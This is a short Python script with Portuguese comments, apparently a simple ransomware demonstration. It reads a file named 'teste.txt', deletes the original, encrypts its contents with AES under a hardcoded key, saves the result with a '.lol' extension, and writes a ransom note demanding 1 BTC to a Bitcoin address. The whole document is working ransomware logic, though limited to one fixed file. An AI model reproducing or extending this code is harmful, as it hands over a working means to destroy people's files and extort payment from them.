import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"_catchmeifucan__"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".lol"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

## Mensagem de resgate
msg = "Pay me 1 BTC to bc1p..."
recovery_file = "recovery.txt"
with open(recovery_file, "w") as recover:
    recover.write(msg)